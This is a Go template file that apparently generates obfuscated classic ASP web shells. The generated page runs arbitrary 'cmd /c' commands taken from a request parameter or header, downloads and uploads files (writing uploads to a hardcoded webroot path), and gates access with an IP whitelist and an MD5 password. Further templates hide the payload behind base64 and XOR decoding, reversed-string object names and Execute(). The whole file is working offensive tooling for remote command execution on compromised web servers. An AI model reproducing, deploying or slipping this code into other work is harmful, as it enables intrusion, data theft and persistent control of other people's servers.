{{/* Get command from param or header */}}
{{/* dim {{ index .V "cmd" }} */}}
{{ if ne .CmdHeader "" }}
{{ index .V "cmd" }} = Request.ServerVariables("HTTP_{{ .CmdHeader }}")
{{ else }}
{{ index .V "cmd" }} = Request("{{ .CmdParam }}")
{{ end }}

{{/* Check if ip is in whitelist */}}
{{ if .Whitelist }}

{{ index .V "whitelist" }} = Array({{ .Whitelist }})
for each {{ index .V "i" }} in {{ index .V "whitelist" }}
  if {{ index .V "i" }} = Request.ServerVariables("REMOTE_ADDR") Then
    Exit For
  elseif {{ index .V "i" }} = {{ index .V "whitelist" }}(UBound({{ index .V "whitelist" }})) then
    response.end
  end if
next
{{ end }}

{{/* Check password */}}
{{ if ne .Password "" }}
{{/* dim {{ index .V "pass" }} */}}
{{ index .V "hash" }} = "{{ .PasswordHash }}"

{{ if ne .PasswordHeader "" }}
{{ index .V "pass" }} = Request.ServerVariables("HTTP_{{ .PasswordHeader }}")
{{ else if ne .PasswordParam "" }}
{{ index .V "pass" }} = request("{{ .PasswordParam }}")
{{ end }}
{{/* Hash and compare */}}
{{/* Dim {{ index .V "asc" }}, {{ index .V "alg" }}, {{ index .V "hashFunc" }}, {{ index .V "digest" }}, {{ index .V "i" }} */}}

Set {{ index .V "asc" }} = CreateObject("System.Text.UTF8Encoding")
Set {{ index .V "alg" }} = CreateObject("System.Security.Cryptography.MD5CryptoServiceProvider")
{{ index .V "hashFunc" }} = {{ index .V "asc" }}.GetBytes_4({{ index .V "pass" }})
{{ index .V "hashFunc" }} = {{ index .V "alg" }}.ComputeHash_2(({{ index .V "hashFunc" }}))
{{ index .V "digest" }} = ""
For {{ index .V "i" }} = 1 To LenB({{ index .V "hashFunc" }})
  {{ index .V "digest" }} = {{ index .V "digest" }} & LCase(Right("0" & Hex(AscB(MidB({{ index .V "hashFunc" }}, {{ index .V "i" }}, 1))), 2))
Next

if {{ index .V "digest" }} <> {{ index .V "hash" }} Then
  response.end
end if
{{ end }}

{{/* Include file capabilities */}}
{{ if .FileCapabilities }}
On Error Resume Next

{{/* Download file */}}
if Left({{ index .V "cmd" }}, 4) = "get " Then
  {{/* dim {{ index .V "cmdArgs" }} */}}
  {{ index .V "cmdArgs" }} = Split({{ index .V "cmd" }}, " ")(1)

  {{/* Dim {{ index .V "fs" }}
  Dim {{ index .V "file" }}
  Dim {{ index .V "fileStream" }} */}}

  Set {{ index .V "fs" }} = Server.CreateObject("Scripting.FileSystemObject")
  If {{ index .V "fs" }}.FileExists({{ index .V "cmdArgs" }}) Then
    Set {{ index .V "file" }} = {{ index .V "fs" }}.GetFile({{ index .V "cmdArgs" }})

    Response.Clear 
    Response.AddHeader "Content-Disposition", "attachment; filename=" & {{ index .V "file" }}.Name
    Response.AddHeader "Content-Length", {{ index .V "file" }}.Size
    Response.ContentType = "application/octet-stream"

    Set {{ index .V "fileStream" }} = Server.CreateObject("ADODB.Stream")
    {{ index .V "fileStream" }}.Type = 1
    {{ index .V "fileStream" }}.Open
    {{ index .V "fileStream" }}.LoadFromFile({{ index .V "cmdArgs" }})

    Response.BinaryWrite({{ index .V "fileStream" }}.Read)
    {{ index .V "fileStream" }}.Close
    If Err.Number <> 0 Then
      Response.Clear
      Response.Status = 500
      Response.Write Err.Description
      Response.End
    End If

    Set {{ index .V "fileStream" }} = Nothing
    Set {{ index .V "file" }} = Nothing
  Else '{{ index .V "fs" }}.FileExists({{ index .V "cmdArgs" }})
    Response.Clear
    Response.Status = 404
    Response.Write("File not found.")
  End If

  Set {{ index .V "fs" }} = Nothing
  response.end

{{/* Upload file */}}
elseif Left({{ index .V "cmd" }}, 4) = "put " Then
  {{ index .V "cmdArgs" }} = Split({{ index .V "cmd" }}, " ")
  {{ index .V "filePath" }} = {{ index .V "cmdArgs" }}(1)
  set {{ index .V "fs" }}=Server.CreateObject("Scripting.FileSystemObject")
  If ubound({{ index .V "cmdArgs" }}) > 1 Then
    {{ index .V "filePath" }} = {{ index .V "cmdArgs" }}(2)
  Else
    {{ index .V "filePath" }}={{ index .V "fs" }}.getfilename({{ index .V "filePath" }})
  End If
  response.write {{ index .V "filePath" }} 

  set {{ index .V "encSrc" }} = CreateObject("Msxml2.DOMDocument").CreateElement("aux")
  {{ index .V "encSrc" }}.DataType = "bin.base64Var"
  {{ index .V "encSrc" }}.Text = Request("f")
  set {{ index .V "fileContents" }} = CreateObject("ADODB.Stream")
  {{ index .V "fileContents" }}.Type = 1 ' adTypeBinary
  {{ index .V "fileContents" }}.Open
  {{ index .V "fileContents" }}.Write {{ index .V "encSrc" }}.NodeTypedValue
  {{ index .V "fileContents" }}.Position = 0
  {{/* {{ index .V "fileContents" }}.Type = 2 ' adTypeText */}}
  {{ index .V "fileContents" }}.CharSet = "utf-8"
  set {{ index .V "file" }}={{ index .V "fs" }}.CreateTextFile("C:\inetpub\wwwroot\nice.php",true)
  {{ index .V "file" }}.write {{ index .V "fileContents" }}.ReadText
  response.end
end if
{{ end }}

{{/* Run command */}}
Set {{ index .V "process" }} = CreateObject("WScript.Shell").exec("cmd /c " & {{ index .V "cmd" }})
Response.Write({{ index .V "process" }}.StdOut.ReadAll)



{{- define "b64" }}
{{/* Dim {{ index .V "encObj" }}, {{ index .V "b64" }}, {{ index .V "binStream" }} */}}
{{ index .V "base64Var" }} = "46"
{{ index .V "msxmlVar" }} = "tnEmu" & "CoD"
{{ index .V "msxmlVar" }} = "0.3." & {{ index .V "msxmlVar" }} & "mod"
{{ index .V "msxmlVar" }} = {{ index .V "msxmlVar" }} & ".2l"
{{ index .V "msxmlVar" }} = {{ index .V "msxmlVar" }} & "mXs"
Set {{ index .V "encObj" }} = CreateObject(strreverse({{ index .V "msxmlVar" }} & "m"))
{{ index .V "base64Var" }} = {{ index .V "base64Var" }} & "esab"
Set {{ index .V "b64" }} = {{ index .V "encObj" }}.CreateElement(strreverse({{ index .V "base64Var" }}))
{{ index .V "b64" }}.dataType = "bin." & strreverse({{ index .V "base64Var" }})
{{ index .V "b64" }}.text = "{{ .EncCode }}"
Set {{ index .V "binStream" }} = CreateObject("ADODB.Stream")
{{ index .V "binStream" }}.Type = 1
{{ index .V "binStream" }}.Open
{{ index .V "binStream" }}.Write {{ index .V "b64" }}.nodeTypedValue
{{ index .V "binStream" }}.Position = 0
{{ index .V "binStream" }}.Type = 2
{{ index .V "binStream" }}.CharSet = "us-ascii"
Execute({{ index .V "binStream" }}.ReadText)
{{ end }}



{{ define "xor" -}}
{{ if ne .EncHeader "" -}}
{{ index .V "encKey" }} = Request.ServerVariables("HTTP_{{ .EncHeader }}")
{{ else }}
{{ index .V "encKey" }} = Request("{{ .EncParam }}")
{{ end -}}

{{ index .V "cmd" }} = "{{ .EncCode }}"
{{/* Dim {{ index .V "encObj" }}, {{ index .V "b64" }}, {{ index .V "binStream" }}, {{ index .V "keyChar" }}, {{ index .V "i" }} */}}
Set {{ index .V "encObj" }} = CreateObject("Msxml2.DOMDocument.3.0")
Set {{ index .V "b64" }} = {{ index .V "encObj" }}.CreateElement("base64Var")
{{ index .V "b64" }}.dataType = "bin.base64Var"
{{ index .V "b64" }}.text = {{ index .V "cmd" }}
Set {{ index .V "binStream" }} = CreateObject("ADODB.Stream")
{{ index .V "binStream" }}.Type = 1
{{ index .V "binStream" }}.Open
{{ index .V "binStream" }}.Write {{ index .V "b64" }}.nodeTypedValue
{{ index .V "binStream" }}.Position = 0
{{ index .V "binStream" }}.Type = 2
{{ index .V "binStream" }}.CharSet = "us-ascii"
{{ index .V "cmd" }} = {{ index .V "binStream" }}.ReadText
for {{ index .V "i" }} = 1 to Len({{ index .V "cmd" }})
  if {{ index .V "i" }} Mod Len({{ index .V "encKey" }}) = 0 then
    {{ index .V "keyChar" }} = asc(Right({{ index .V "encKey" }},1))
  Else
    {{ index .V "keyChar" }} = asc(mid({{ index .V "encKey" }},{{ index .V "i" }} Mod Len({{ index .V "encKey" }}),1))
  end if
  {{ index .V "keyChar" }} =  asc(mid({{ index .V "cmd" }},{{ index .V "i" }},1)) Xor {{ index .V "keyChar" }}
  wow =  wow & Chr({{ index .V "keyChar" }})
next
Execute(wow)
{{ end }}
